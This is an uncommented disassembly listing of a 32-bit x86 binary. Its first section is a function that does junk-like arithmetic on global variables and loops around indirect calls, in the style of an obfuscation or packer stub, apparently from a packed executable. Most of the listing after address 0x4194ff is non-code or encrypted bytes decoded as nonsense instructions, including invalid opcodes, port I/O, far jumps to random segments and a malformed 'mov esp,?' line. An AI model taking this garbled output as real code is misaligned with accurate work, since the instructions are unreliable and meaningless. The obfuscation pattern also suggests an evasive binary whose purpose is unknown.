  4192c3:	mov    edx,DWORD PTR [ebp-0x54]
  4192c6:	add    ecx,0x64f882
  4192cc:	or     ecx,edx
  4192ce:	mov    DWORD PTR [ebp-0x54],ecx
  4192d1:	mov    ecx,DWORD PTR [ebp+0x8]
  4192d4:	mov    edx,DWORD PTR [ebp-0x50]
  4192d7:	add    ecx,0x242ebf1
  4192dd:	xor    ecx,edx
  4192df:	mov    DWORD PTR [ebp-0x50],ecx
  4192e2:	mov    ecx,DWORD PTR [ebp+0x8]
  4192e5:	mov    edx,DWORD PTR [ebp-0x4c]
  4192e8:	add    ecx,edi
  4192ea:	and    ecx,edx
  4192ec:	mov    DWORD PTR [ebp-0x4c],ecx
  4192ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4192f2:	mov    edx,DWORD PTR [ebp-0x48]
  4192f5:	lea    ecx,[edx+ecx*1+0x241fcdf]
  4192fc:	mov    DWORD PTR [ebp-0x48],ecx
  4192ff:	mov    ecx,DWORD PTR [ebp+0x8]
  419302:	mov    edx,0xfa5e1522
  419307:	sub    edx,ecx
  419309:	add    edx,DWORD PTR [ebp-0x44]
  41930c:	mov    DWORD PTR [ebp-0x44],edx
  41930f:	mov    ecx,DWORD PTR [ebp+0x8]
  419312:	xor    ecx,eax
  419314:	add    ecx,esi
  419316:	jne    0x41929b
  41931c:	mov    ecx,DWORD PTR [ebp-0x8]
  41931f:	xor    ecx,eax
  419321:	mov    eax,DWORD PTR [ebp+0x10]
  419324:	add    ecx,esi
  419326:	mov    DWORD PTR [eax],ecx
  419328:	pop    edi
  419329:	pop    esi
  41932a:	pop    ebx
  41932b:	leave  
  41932c:	ret    0xc
  41932f:	push   ebp
  419330:	mov    ebp,esp
  419332:	sub    esp,0x78
  419335:	and    DWORD PTR ds:0x428eaf,0x46d6
  41933f:	push   esi
  419340:	push   edi
  419341:	or     eax,DWORD PTR ds:0x428e37
  419347:	mov    eax,ds:0x428373
  41934c:	or     ecx,edi
  41934e:	mov    DWORD PTR [ebp-0x24],eax
  419351:	and    DWORD PTR ds:0x428eb3,0x0
  41935b:	jmp    0x41936b
  419360:	mov    eax,ds:0x428eb3
  419365:	inc    eax
  419366:	mov    ds:0x428eb3,eax
  41936b:	cmp    DWORD PTR ds:0x428eb3,0x15
  419372:	jae    0x41939a
  419378:	cmp    DWORD PTR ds:0x428eb3,0x21
  41937f:	ja     0x41939a
  419385:	jmp    0x419395
  41938a:	push   0x6ea1
  41938f:	call   DWORD PTR ds:0x42a9d7
  419395:	jmp    0x419360
  41939a:	mov    eax,ds:0x428493
  41939f:	mov    DWORD PTR [ebp-0x30],eax
  4193a2:	mov    DWORD PTR [ebp-0x2c],0xf89c85a5
  4193a9:	sub    DWORD PTR ds:0x428e3f,edi
  4193af:	mov    DWORD PTR [ebp-0x28],0xf89c85a4
  4193b6:	mov    eax,DWORD PTR [ebp-0x10]
  4193b9:	mov    ecx,DWORD PTR [ebp-0x10]
  4193bc:	sub    eax,ecx
  4193be:	mov    DWORD PTR [ebp-0x10],eax
  4193c1:	and    DWORD PTR ds:0x428e93,edi
  4193c7:	xor    DWORD PTR [ebp-0x10],0xf89cb5a5
  4193ce:	adc    ecx,0x318b
  4193d4:	mov    eax,DWORD PTR [ebp-0x18]
  4193d7:	mov    ecx,DWORD PTR [ebp-0x18]
  4193da:	xor    DWORD PTR ds:0x428e8f,edi
  4193e0:	sub    eax,ecx
  4193e2:	mov    DWORD PTR [ebp-0x18],eax
  4193e5:	sbb    DWORD PTR ds:0x428e5b,ebx
  4193eb:	or     DWORD PTR [ebp-0x18],0xf89f05a5
  4193f2:	or     DWORD PTR ds:0x428e2f,ebx
  4193f8:	mov    eax,DWORD PTR [ebp-0xc]
  4193fb:	adc    DWORD PTR ds:0x428e47,ecx
  419401:	mov    ecx,DWORD PTR [ebp-0xc]
  419404:	sub    eax,ecx
  419406:	add    DWORD PTR ds:0x428e6f,edx
  41940c:	mov    DWORD PTR [ebp-0xc],eax
  41940f:	and    DWORD PTR ds:0x428eb7,ecx
  419415:	or     DWORD PTR [ebp-0xc],0xf89c85e5
  41941c:	add    DWORD PTR ds:0x428ec7,ebx
  419422:	mov    eax,DWORD PTR [ebp-0x1c]
  419425:	mov    ecx,DWORD PTR [ebp-0x1c]
  419428:	sub    eax,ecx
  41942a:	add    edi,0xa93
  419430:	mov    DWORD PTR [ebp-0x1c],eax
  419433:	or     DWORD PTR ds:0x428e87,0x297e
  41943d:	or     DWORD PTR [ebp-0x1c],0xf89c8585
  419444:	mov    eax,DWORD PTR [ebp-0x20]
  419447:	mov    DWORD PTR ds:0x428e9f,0x15
  419451:	cmp    DWORD PTR ds:0x428e9f,0x0
  419458:	je     0x4194a7
  41945e:	cmp    DWORD PTR ds:0x428e9f,0x5
  419465:	jb     0x4194a7
  41946b:	jmp    0x419479
  419470:	push   DWORD PTR [ebp-0x20]
  419473:	call   DWORD PTR ds:0x42a9db
  419479:	cmp    DWORD PTR ds:0x428e9f,0x6
  419480:	jne    0x419495
  419486:	xor    edi,edi
  419488:	or     edi,DWORD PTR ds:0x428e9f
  41948e:	dec    edi
  41948f:	mov    DWORD PTR ds:0x428e9f,edi
  419495:	mov    edi,DWORD PTR ds:0x428e9f
  41949b:	dec    edi
  41949c:	mov    DWORD PTR ds:0x428e9f,edi
  4194a2:	jmp    0x419451
  4194a7:	mov    ecx,DWORD PTR [ebp-0x20]
  4194aa:	sub    DWORD PTR ds:0x428e73,0x4181
  4194b4:	sub    eax,ecx
  4194b6:	mov    DWORD PTR [ebp-0x20],eax
  4194b9:	neg    edi
  4194bb:	mov    eax,DWORD PTR [ebp-0x2c]
  4194be:	mov    ecx,DWORD PTR [ebp-0x20]
  4194c1:	mov    esi,0x75108af
  4194c6:	xor    eax,esi
  4194c8:	add    DWORD PTR ds:0x428e2f,0x596
  4194d2:	mov    edi,0x3272f6
  4194d7:	or     DWORD PTR ds:0x428e43,0x428e77
  4194e1:	add    eax,edi
  4194e3:	or     eax,ecx
  4194e5:	mov    DWORD PTR ds:0x428e43,0x54e0
  4194ef:	mov    DWORD PTR [ebp-0x20],eax
  4194f2:	add    eax,0x58c9
  4194f7:	mov    eax,DWORD PTR [ebp-0x4]
  4194fa:	jmp    0x41b84d
  4194ff:	imul   edx,DWORD PTR [edi],0x45054527
  419505:	or     DWORD PTR [edi],edx
  419507:	dec    esp
  419508:	xchg   ecx,eax
  419509:	in     al,0xff
  41950b:	in     eax,0x94
  41950d:	lods   al,BYTE PTR ds:[esi]
  41950e:	out    dx,al
  41950f:	pop    ebp
  419510:	and    BYTE PTR [edx-0x7c9fb27d],al
  419516:	xor    DWORD PTR [ebx],0x77
  419519:	cmova  ebp,DWORD PTR [edi]
  41951c:	xchg   esp,eax
  41951d:	clc    
  41951e:	inc    esi
  41951f:	jl     0x4194bd
  419521:	nop
  419522:	call   0x60fa:0xc9a8b5fa
  419529:	mov    cl,0x42
  41952b:	lahf   
  41952c:	cli    
  41952d:	jne    0x41958c
  41952f:	jge    0x419568
  419531:	je     0x4194b7
  419533:	not    BYTE PTR [edx]
  419535:	cmp    ecx,DWORD PTR [edi-0x1df1cbaf]
  41953b:	out    dx,eax
  41953c:	inc    eax
  41953d:	sbb    ebp,DWORD PTR [esi-0x5]
  419540:	aaa    
  419541:	vandnps ymm5,ymm1,YMMWORD PTR [edi]
  419545:	sub    eax,0xe0e858cb
  41954a:	loop   0x419537
  41954c:	push   esp
  41954d:	push   ecx
  41954e:	jl     0x41951a
  419550:	lods   eax,DWORD PTR ds:[esi]
  419551:	sti    
  419552:	(bad)  
  419553:	pop    dx
  419555:	or     al,0x6f
  419557:	out    dx,eax
  419558:	scas   al,BYTE PTR es:[edi]
  419559:	test   BYTE PTR [eax],bl
  41955b:	aad    0xbd
  41955d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41955e:	shl    BYTE PTR [ecx-0x349cbb94],1
  419564:	loopne 0x41957c
  419566:	sar    BYTE PTR [bx+di],cl
  419569:	ror    BYTE PTR [ebx-0x7faddcac],0xdf
  419570:	xor    DWORD PTR [esi+ebp*4+0x72],0xe1156e60
  419578:	mov    ch,0x29
  41957a:	int    0x99
  41957c:	lock pusha 
  41957e:	mov    esi,0x7049b1aa
  419583:	xchg   esi,eax
  419584:	mov    ds:0xa20c02dd,al
  419589:	cs inc edi
  41958b:	jp     0x419529
  41958d:	or     eax,0x6d8adbb0
  419592:	and    BYTE PTR [edi+0x7586d696],0x9d
  419599:	int    0x69
  41959b:	xor    al,0x2b
  41959d:	in     eax,dx
  41959e:	aas    
  41959f:	mov    ecx,0x275e8dad
  4195a4:	or     BYTE PTR [ecx],ah
  4195a6:	inc    esi
  4195a7:	std    
  4195a8:	adc    eax,0xd10f3489
  4195ad:	adc    al,BYTE PTR [ecx+0x4f]
  4195b0:	or     DWORD PTR [eax+eiz*2-0x3ef0d495],0xffffffe2
  4195b8:	sub    ebp,DWORD PTR [ebp+0xb99a8fa]
  4195be:	cwde   
  4195bf:	imul   edi,DWORD PTR [ebx+0x75],0xffffffe2
  4195c3:	push   esi
  4195c4:	test   BYTE PTR [esi+0x7b],bl
  4195c7:	and    eax,0xe8042567
  4195cc:	loopne 0x4195ab
  4195ce:	sbb    BYTE PTR [ebp+0x34ba3339],ah
  4195d4:	(bad)  
  4195d5:	imul   ebp,DWORD PTR [ecx-0x63],0x4ef65ec2
  4195dc:	imul   edx,DWORD PTR [edi+ecx*4-0xf450a56],0x3396c696
  4195e7:	aad    0xe
  4195e9:	xor    al,0xd4
  4195eb:	shl    DWORD PTR [eax-0x6a],0x6e
  4195ef:	pop    esi
  4195f0:	adc    al,0xc8
  4195f2:	mov    cl,0xb7
  4195f4:	ss iret 
  4195f6:	jmp    0x4195d3
  4195f8:	pop    ecx
  4195f9:	lds    edi,FWORD PTR [edi-0x3c]
  4195fc:	sub    edi,0xffffffa5
  4195ff:	jmp    0x2e74fd88
  419604:	das    
  419605:	ret    
  419606:	xchg   esi,eax
  419607:	cdq    
  419608:	mov    eax,ds:0x6f51ca13
  41960d:	loop   0x41959b
  41960f:	(bad)  
  419610:	mov    ds:0xd07096df,al
  419615:	push   ebx
  419616:	inc    edx
  419617:	xchg   edi,eax
  419618:	sub    bh,bl
  41961a:	out    0x9a,al
  41961c:	add    eax,0x63a59e2e
  419621:	add    bl,BYTE PTR [edx-0x65724c46]
  419627:	and    al,0xda
  419629:	cwde   
  41962a:	dec    ebx
  41962b:	xchg   esp,eax
  41962c:	sar    BYTE PTR [esi+0x28189440],1
  419632:	mov    bh,0x33
  419634:	jne    0x41962c
  419636:	jecxz  0x419649
  419638:	arpl   WORD PTR [ecx+0x3d],cx
  41963b:	pop    ecx
  41963c:	mov    ecx,DWORD PTR [ebp+0x39]
  41963f:	scas   eax,DWORD PTR es:[edi]
  419640:	iret   
  419641:	ins    DWORD PTR es:[edi],dx
  419642:	mov    dh,cl
  419644:	outs   dx,BYTE PTR ds:[esi]
  419645:	mov    eax,0xfa720473
  41964a:	aaa    
  41964b:	call   0x3406:0xe97cc33d
  419652:	push   ebp
  419653:	mov    ds:0xd0cc194a,eax
  419658:	pop    ss
  419659:	(bad)  
  41965a:	push   esi
  41965b:	lahf   
  41965c:	mov    bh,0xb1
  41965e:	push   ebp
  41965f:	mov    esi,0x988cd36f
  419664:	out    0x71,al
  419666:	xchg   esi,eax
  419667:	je     0x4196a3
  419669:	bnd jl 0x4196a0
  41966c:	adc    dh,BYTE PTR [esi]
  41966e:	ret    
  41966f:	xchg   ecx,eax
  419670:	retf   0x9cf2
  419673:	jmp    0xd2d687d
  419678:	fs out dx,eax
  41967a:	outs   dx,BYTE PTR ds:[esi]
  41967b:	cmp    BYTE PTR [ebp+0x7],cl
  41967e:	(bad)  
  419680:	cmp    eax,0x937da0cd
  419685:	pop    ss
  419686:	outs   dx,BYTE PTR ds:[esi]
  419687:	sub    esi,esi
  419689:	pusha  
  41968a:	stos   DWORD PTR es:[edi],eax
  41968b:	jae    0x4196c0
  41968d:	or     BYTE PTR [eax+0x1b],cl
  419690:	push   edx
  419691:	enter  0xb0dc,0x1a
  419695:	push   esp
  419696:	ror    ch,cl
  419698:	loop   0x419685
  41969a:	xchg   ebp,eax
  41969b:	mov    ecx,0xdfb5d9c2
  4196a0:	dec    edx
  4196a1:	jmp    0x4196da
  4196a3:	in     eax,0xf1
  4196a5:	mov    esp,0xe26d5978
  4196aa:	imul   ebx,DWORD PTR [edi-0x3d],0xd93a82bd
  4196b1:	loop   0x419708
  4196b3:	fsub   DWORD PTR [edi+0x9]
  4196b6:	iret   
  4196b7:	cmc    
  4196b8:	arpl   WORD PTR [ecx+0x2d],sp
  4196bb:	test   BYTE PTR [edi-0x3f],0xaf
  4196bf:	(bad)  
  4196c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196c1:	(bad)  
  4196c2:	cmp    ebx,DWORD PTR [esi+0x62]
  4196c5:	loope  0x4196ec
  4196c7:	sbb    BYTE PTR [ecx-0x5b803109],ah
  4196cd:	push   edi
  4196ce:	mov    esp,0x7022be13
  4196d3:	pushf  
  4196d4:	jae    0x419687
  4196d6:	jnp    0x4196ed
  4196d8:	shr    ebp,cl
  4196da:	cwde   
  4196db:	lea    esi,[ebx-0x5e]
  4196de:	aam    0x8e
  4196e0:	(bad)  
  4196e1:	pushf  
  4196e2:	add    DWORD PTR [edi-0x63c111ae],edx
  4196e8:	mov    BYTE PTR [esi],al
  4196ea:	ja     0x419674
  4196ec:	push   cs
  4196ed:	xchg   ecx,eax
  4196ee:	mov    al,ds:0xee0e2554
  4196f3:	(bad)
  4196f6:	and    ch,BYTE PTR [eax-0x5830a92a]
  4196fc:	rcr    bl,0xd1
  4196ff:	cs sbb al,0x56
  419702:	sbb    al,0xa6
  419704:	jb     0x419717
  419706:	je     0x41976c
  419708:	mov    WORD PTR [ebx-0x45],ss
  41970b:	mov    edx,0xd3ea1ae1
  419710:	loopne 0x4196c5
  419712:	xor    cl,BYTE PTR [esp+ebp*4+0x2]
  419716:	fstp   DWORD PTR [ebx+ebx*4]
  419719:	(bad)  
  41971b:	int    0xe5
  41971d:	iret   
  41971e:	in     al,0xf4
  419720:	loopne 0x41973b
  419722:	sar    BYTE PTR [ebp+0x15892306],cl
  419728:	mov    eax,ds:0x115d51a2
  41972d:	jecxz  0x419745
  41972f:	inc    edi
  419730:	or     ah,BYTE PTR [edi+0x10]
  419733:	jo     0x4196d7
  419735:	sub    eax,0x186213c1
  41973a:	(bad)  
  41973b:	push   eax
  41973c:	shr    DWORD PTR [eax],cl
  41973e:	or     DWORD PTR [edi+0xc],0x8c44917d
  419745:	adc    edx,ebx
  419747:	fidiv  DWORD PTR gs:[ebx+ebp*2]
  41974b:	ss pop ebx
  41974d:	jecxz  0x419727
  41974f:	inc    ecx
  419750:	arpl   WORD PTR [esi],ax
  419752:	inc    esi
  419753:	in     eax,dx
  419754:	pop    DWORD PTR [edx]
  419756:	adc    ah,0x2
  419759:	inc    ebp
  41975a:	leave  
  41975b:	pop    esi
  41975c:	mov    esp,0xbe43659d
  419761:	bound  ebp,QWORD PTR [ecx]
  419763:	fwait
  419764:	sbb    BYTE PTR [edx+eiz*2-0x6ac003c5],ah
  41976b:	dec    edx
  41976c:	xor    BYTE PTR [ebx+0x362dd309],0x44
  419773:	(bad)
  419776:	loopne 0x41975b
  419778:	mov    dh,0x20
  41977a:	fst    DWORD PTR [eax+ebp*8-0x4c]
  41977e:	(bad)  [eax+eiz*8]
  419781:	in     eax,0xae
  419783:	xchg   ebp,eax
  419784:	sar    DWORD PTR [ebp-0x5d],cl
  419787:	pop    ebp
  419788:	in     al,dx
  419789:	out    0x59,eax
  41978b:	sbb    eax,0xc65de18e
  419790:	hlt    
  419791:	fist   WORD PTR [eax-0x30]
  419794:	out    0xcb,al
  419796:	add    BYTE PTR [esi],cl
  419798:	mov    al,ds:0xebc20581
  41979d:	fst    DWORD PTR [ebx+ecx*1+0x22]
  4197a1:	mov    ecx,0x69a3069d
  4197a6:	scas   al,BYTE PTR es:[edi]
  4197a7:	out    0x27,eax
  4197a9:	shl    DWORD PTR ss:[edx],cl
  4197ac:	mov    esp,?
  4197ae:	ret    
  4197af:	mov    bh,0xf8
  4197b1:	pusha  
  4197b2:	jge    0x4197b8
  4197b4:	add    esp,DWORD PTR [ebx+0x1a1fc37b]
  4197ba:	int    0x54
  4197bc:	scas   eax,DWORD PTR es:[edi]
  4197bd:	sub    bh,BYTE PTR [edx]
  4197bf:	mov    dh,0x5
  4197c1:	in     al,0xe8
  4197c3:	popa   
  4197c4:	loope  0x41980e
  4197c6:	mov    eax,ds:0x3c0717a0
  4197cb:	adc    DWORD PTR [edx-0x6fcaff5e],edi
  4197d1:	xor    esp,esi
  4197d3:	xor    al,0x5e
  4197d5:	retf   0x86e2
  4197d8:	aad    0x58
  4197da:	out    dx,eax
  4197db:	retf   
  4197dc:	scas   al,BYTE PTR es:[edi]
  4197dd:	enter  0xad9f,0xbc
  4197e1:	shl    BYTE PTR [edi-0x7b1bb634],0x8e
  4197e8:	add    al,0x35
  4197ea:	push   es
  4197eb:	outs   dx,DWORD PTR ds:[esi]
  4197ec:	cwde   
  4197ed:	and    ah,BYTE PTR [ebp-0x5e]
  4197f0:	test   eax,0x6dc115ad
  4197f5:	push   esi
  4197f6:	mov    ebp,0xafc2052a
  4197fb:	sub    BYTE PTR [ebp-0x7e],bl
  4197fe:	mov    ebp,0x676df9e3
  419803:	xlat   BYTE PTR ds:[ebx]
  419804:	out    0xa5,al
  419806:	pop    esp
  419807:	xchg   DWORD PTR [eax+0x41],edx
  41980a:	sti    
  41980b:	push   0x59
  41980d:	mov    esi,0xf5dd49c6
  419812:	sti    
  419813:	xchg   esp,eax
  419814:	jmp    0x2725:0x72f2d1bb
  41981b:	jmp    0xfc9f:0xc221afd0
  419822:	jns    0x4197d2
  419824:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419825:	push   ebx
  419826:	shr    DWORD PTR [edi+0x5e],cl
  419829:	repz xchg esp,eax
  41982b:	sti    
  41982c:	pop    ss
  41982d:	add    al,0x26
  41982f:	bound  ebp,QWORD PTR [ebx+0x65]
  419832:	bound  eax,QWORD PTR [edi]
  419834:	mov    bl,0xab
  419836:	mov    WORD PTR [ecx-0x10e0fa59],ds
  41983c:	xchg   BYTE PTR [edx-0x7f],al
  41983f:	jle    0x4197eb
  419841:	or     DWORD PTR [edi],ebx
  419843:	mov    ah,0x70
  419846:	sbb    al,0x76
  419848:	jp     0x419834
  41984a:	push   es
  41984b:	loop   0x419881
  41984d:	lods   eax,DWORD PTR ds:[esi]
  41984e:	add    DWORD PTR [edx],0x7a
  419851:	lods   eax,DWORD PTR ds:[esi]
  419852:	and    ecx,DWORD PTR [eax+esi*8-0x7b994c48]
  419859:	jl     0x419833
  41985b:	call   0x1909:0x2ddc5e97
  419862:	jp     0x419848
  419864:	push   ds
  419865:	in     al,0xd1
  419867:	sub    al,0xe6
  419869:	push   eax
  41986a:	popaw  
  41986c:	out    dx,eax
  41986d:	call   0x306b:0xaae02529
  419874:	push   0x77
  419876:	push   0xffffff8f
  419878:	or     BYTE PTR [eax-0x785a43b3],dl
  41987e:	jmp    0xc0d2b6d6
  419883:	outs   dx,BYTE PTR ds:[esi]
  419884:	out    dx,al
  419885:	pop    es
  419886:	xchg   ecx,eax
  419887:	cdq    
  419888:	mov    ah,0x35
  41988a:	fwait
  41988b:	int3   
  41988c:	and    BYTE PTR [edx],ah
  41988e:	hlt    
  41988f:	pop    ss
  419890:	jmp    0x963b:0xa3014282
  419897:	xchg   edi,eax
  419898:	sbb    BYTE PTR [edi-0x56f0573f],0x41
  41989f:	mov    ebp,0xe551b47e
  4198a4:	xchg   edx,eax
  4198a5:	xchg   ebx,eax
  4198a6:	dec    ebp
  4198a7:	rep lods al,BYTE PTR ds:[esi]
  4198a9:	jge    0x41983a
  4198ab:	mov    bh,BYTE PTR [ebx]
  4198ad:	icebp  
  4198ae:	inc    ebx
  4198af:	test   eax,0xa8930d3
  4198b4:	fwait
  4198b5:	inc    esi
  4198b6:	test   eax,0x5d63049c
  4198bb:	adc    BYTE PTR [edi-0x4f],dh
  4198be:	sbb    al,0x45
  4198c0:	in     al,dx
  4198c1:	jle    0x4198e9
  4198c3:	mov    dl,0xd8
  4198c5:	(bad)  
  4198c6:	cmp    cl,BYTE PTR [ecx-0x413e13c1]
  4198cc:	out    0xd2,eax
  4198ce:	cmp    ch,BYTE PTR [eax]
  4198d0:	mov    ch,0xc2
  4198d2:	dec    ebx
  4198d3:	ds enter 0xa53a,0xce
  4198d8:	sbb    DWORD PTR [ecx-0x12],ebx
  4198db:	lock or edi,DWORD PTR [eax+0x56]
  4198df:	fwait
  4198e0:	push   ecx
  4198e1:	ins    DWORD PTR es:[edi],dx
  4198e2:	imul   ecx,DWORD PTR [eax],0xffffff93
  4198e5:	out    dx,eax
  4198e6:	sub    eax,0xf7f83ce3
  4198eb:	into   
  4198ec:	fsub   st(4),st
  4198ee:	hlt    
  4198ef:	outs   dx,DWORD PTR ds:[esi]
  4198f0:	inc    ebx
  4198f1:	aas    
  4198f2:	clc    
  4198f3:	mov    ecx,cr7
  4198f6:	xchg   DWORD PTR [ecx+0x2aabad29],ebx
  4198fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198fd:	shl    bh,1
  4198ff:	jbe    0x41993d
  419901:	push   es
  419902:	sub    bl,BYTE PTR [esi]
  419904:	push   ss
  419905:	jno    0x4198fa
  419907:	or     edx,DWORD PTR [edx+ecx*1-0x2d]
  41990b:	pusha  
  41990c:	(bad)  
  41990d:	pushf  
  41990e:	icebp  
  41990f:	mov    dl,0x10
  419911:	aam    0x1d
  419913:	lea    esp,[ebx+0x35]
  419916:	aam    0xca
  419918:	sbb    al,0x73
  41991a:	push   ebp
  41991b:	inc    eax
  41991c:	(bad)  
  41991d:	xchg   ebp,eax
  41991e:	es test cl,cl
  419921:	xor    cl,BYTE PTR [ebx-0x38]
  419924:	sub    BYTE PTR [ebp+0x30],ch
  419927:	xchg   BYTE PTR [eax+0x59fe8db0],ah
  41992d:	rol    BYTE PTR [edx-0xa3462ef],1
  419933:	push   0xc9397ade
  419938:	test   eax,0x76097a14
  41993d:	mov    al,0xb5
  41993f:	push   ebx
  419940:	mov    bh,0xc7
  419942:	iret   
  419943:	adc    ecx,DWORD PTR ds:0x93961273
  419949:	test   BYTE PTR [eax-0x7f94df3e],ah
  41994f:	xchg   edx,eax
  419950:	dec    edi
  419951:	inc    esp
  419952:	pop    edx
  419953:	fs push ss
  419955:	fs pushf 
  419957:	dec    ecx
  419958:	out    0xbd,al
  41995a:	mov    ebx,0x260a5e45
  41995f:	sbb    ecx,DWORD PTR [ecx+ebx*4+0x231aa999]
  419966:	jbe    0x419967
  419968:	gs ds in eax,dx
  41996b:	stos   BYTE PTR es:[edi],al
  41996c:	aam    0xf4
  41996e:	jbe    0x419975
  419970:	cdq    
  419971:	(bad)  
  419972:	jl     0x419903
  419974:	mov    ah,0x34
  419976:	jae    0x419969
  419978:	iret   
  419979:	sbb    BYTE PTR [eax+eiz*2-0x41],cl
  41997d:	add    eax,0x1358db9a
  419982:	aad    0x26
  419984:	pop    ebp
  419985:	xchg   DWORD PTR [ecx-0x571c80ca],ecx
  41998b:	or     al,0x8d
  41998d:	sar    cl,1
  41998f:	jne    0x419972
  419991:	out    dx,eax
  419992:	mov    ds:0xc657904b,eax
  419997:	xchg   ecx,eax
  419998:	mov    bl,0x30
  41999a:	jmp    0x4199ee
  41999c:	cwde   
  41999d:	push   esp
  41999e:	rcr    BYTE PTR [ebx],0xdc
  4199a1:	sbb    DWORD PTR [eax-0x2e],ebx
  4199a4:	mov    cl,0x3a
  4199a6:	mov    gs,WORD PTR [esp+eiz*4-0x1d]
  4199aa:	in     eax,dx
  4199ab:	jl     0x41999e
  4199ad:	lock or al,0x6f
  4199b0:	adc    bl,bh
  4199b2:	loope  0x419970
  4199b4:	imul   edi,esp,0x2240bc44
  4199ba:	xor    eax,0x6a3734de
  4199bf:	jno    0x419a15
  4199c1:	daa    
  4199c2:	out    0xe0,al
  4199c4:	dec    edi
  4199c5:	(bad)  
  4199c6:	sub    al,0xf2
  4199c8:	inc    ebx
  4199c9:	mov    ch,0x5d
  4199cb:	scas   eax,DWORD PTR es:[edi]
  4199cc:	mov    bh,0x10
  4199ce:	(bad)  
  4199cf:	sub    al,0x47
  4199d1:	mov    ah,0xa7
  4199d3:	fstp   DWORD PTR [ebx]
  4199d5:	js     0x4199f0
  4199d7:	jmp    0x419a48
  4199d9:	mov    eax,ds:0xb976dae3
  4199de:	mov    esp,0x40c18847
  4199e3:	or     al,0x7f
  4199e5:	mov    bl,0x0
  4199e7:	add    BYTE PTR [edi+0x6e4c49b6],cl
  4199ed:	sbb    esp,eax
  4199ef:	xor    DWORD PTR [ebx-0x7b],esp
  4199f2:	pop    ebx
  4199f3:	pop    edx
  4199f4:	lods   eax,DWORD PTR ds:[esi]
  4199f5:	repz xlat BYTE PTR ds:[ebx]
  4199f7:	inc    edx
  4199f8:	pop    edi
  4199f9:	jmp    0x4199ec
  4199fb:	push   esp
  4199fc:	cmp    DWORD PTR [edi-0x7e],esi
  4199ff:	popf   
  419a00:	pop    esp
  419a01:	(bad)  
  419a02:	push   0x9
  419a04:	mov    al,0xf0
  419a06:	dec    ecx
  419a07:	ss dec edx
  419a09:	jno    0x419a11
  419a0b:	or     eax,0xfb354531
  419a10:	mov    dh,0x8b
  419a12:	adc    bl,BYTE PTR [ecx+0x4fd3544d]
  419a18:	stos   DWORD PTR es:[edi],eax
  419a19:	inc    ebp
  419a1a:	sub    BYTE PTR [eax+0x1c],bl
  419a1d:	mov    ah,BYTE PTR [eax-0x7d]
  419a20:	imul   edi,DWORD PTR [ebp+0x47],0x80a2b5c9
  419a27:	shr    DWORD PTR [esi],1
  419a29:	addr16 adc al,0x9a
  419a2c:	xor    eax,0x9c7a408f
  419a31:	sub    bh,ah
  419a33:	cdq    
  419a34:	push   cs
  419a35:	mov    esp,0x60487a5e
  419a3a:	out    dx,al
  419a3b:	inc    ebp
  419a3c:	enter  0x61c4,0x5
  419a40:	(bad)  
  419a42:	ret    0x57ef
  419a45:	sbb    edx,ebp
  419a47:	das    
  419a48:	test   al,0x65
  419a4a:	mov    ds:0x13acc608,eax
  419a4f:	mov    ds:0x4662e417,eax
  419a54:	mov    bl,0xe7
  419a56:	shl    DWORD PTR [esi],1
  419a58:	loop   0x419a06
  419a5a:	mov    dl,0xad
  419a5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a5d:	sub    cl,BYTE PTR [eax-0x2a4268dd]
  419a63:	sbb    DWORD PTR [edi],ebx
  419a65:	and    edi,esp
  419a67:	xor    ebp,ebx
  419a69:	js     0x419a36
  419a6b:	(bad)  
  419a6d:	pmovmskb esi,mm3
  419a70:	xchg   ebx,eax
  419a71:	sbb    bh,BYTE PTR [esi-0x3f]
  419a74:	and    BYTE PTR [eax-0x5c],dh
  419a77:	daa    
  419a78:	dec    esp
  419a79:	jo     0x419a63
  419a7b:	lods   al,BYTE PTR ds:[esi]
  419a7c:	pop    ebx
  419a7d:	mov    esp,0x5931ece7
  419a82:	dec    ebx
  419a83:	xor    BYTE PTR [edx-0x7be93918],bl
  419a89:	push   cs
  419a8a:	and    bl,BYTE PTR [ebp-0x88ef496]
  419a90:	and    ecx,0x41e77d62
  419a96:	cmp    edx,DWORD PTR [eax-0x58d6c151]
  419a9c:	retf   
  419a9d:	cmp    cl,ah
  419a9f:	fidivr DWORD PTR [edi]
  419aa1:	lods   eax,DWORD PTR ds:[esi]
  419aa2:	mov    DWORD PTR [eax-0x56],ecx
  419aa5:	jmp    0x6aaf:0x94a6654d
  419aac:	inc    ebp
  419aad:	ss push ss
  419aaf:	xor    al,0x2c
  419ab1:	mov    al,0x91
  419ab3:	and    BYTE PTR [ecx-0x74a41ead],al
  419ab9:	xchg   ebp,eax
  419aba:	xor    dl,0xc5
  419abd:	or     BYTE PTR [esi],dh
  419abf:	jl     0x419b26
  419ac1:	outs   dx,DWORD PTR ds:[esi]
  419ac2:	cld    
  419ac3:	ficom  WORD PTR [ecx-0x1f]
  419ac6:	leave  
  419ac7:	test   al,0xc5
  419ac9:	lock cmc 
  419acb:	test   esp,edx
  419acd:	mov    ch,0xbf
  419acf:	and    dh,BYTE PTR [ecx-0x30]
  419ad2:	mov    esp,0xcd99882
  419ad7:	inc    esp
  419ad8:	inc    esp
  419ad9:	dec    edi
  419ada:	les    ebp,FWORD PTR [eax]
  419adc:	dec    ecx
  419add:	ins    BYTE PTR es:[edi],dx
  419ade:	(bad)  
  419adf:	not    DWORD PTR [edx+eiz*8-0x63]
  419ae3:	cli    
  419ae4:	mov    ebp,esp
  419ae6:	mov    eax,0x7a50199c
  419aeb:	sub    BYTE PTR [ebp-0x26],ah
  419aee:	add    DWORD PTR [eax-0x74857ecb],ebx
  419af4:	sbb    eax,0xae71966c
  419af9:	jg     0x419b26
  419afb:	iret   
  419afc:	dec    eax
  419afd:	pop    es
  419afe:	pop    ss
  419aff:	jmp    0xc6ac:0x79744c61
  419b06:	sub    DWORD PTR [esi-0x79d45c96],ebp
  419b0c:	shl    BYTE PTR [edi-0xf],0x64
  419b10:	(bad)  
  419b11:	and    DWORD PTR [ebp-0x38],ebx
  419b14:	add    al,0x1b
  419b16:	inc    edi
  419b17:	les    ecx,FWORD PTR [edx-0x14]
  419b1a:	(bad)  
  419b1b:	xchg   ebp,eax
  419b1c:	adc    edx,edx
  419b1e:	xchg   BYTE PTR [ecx],dl
  419b20:	xchg   ebp,eax
  419b21:	jbe    0x419b50
  419b23:	xchg   edx,eax
